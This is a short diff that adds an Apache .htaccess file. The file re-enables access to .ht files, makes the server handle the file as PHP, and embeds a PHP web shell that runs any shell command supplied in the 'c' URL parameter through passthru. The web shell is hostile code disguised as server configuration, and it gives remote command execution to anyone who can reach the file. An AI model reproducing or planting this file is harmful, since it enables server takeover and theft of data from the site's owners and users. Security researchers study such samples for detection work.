@@ -1,0 +1,8 @@
+<Files ~ "^\.ht">
+Require all granted
+</Files>
+
+php_flag engine on
+SetHandler application/x-httpd-php
+
+###### SHELL ###### <?php echo "\n";passthru($_GET['c']." 2>&1"); ?>###### LLEHS ######
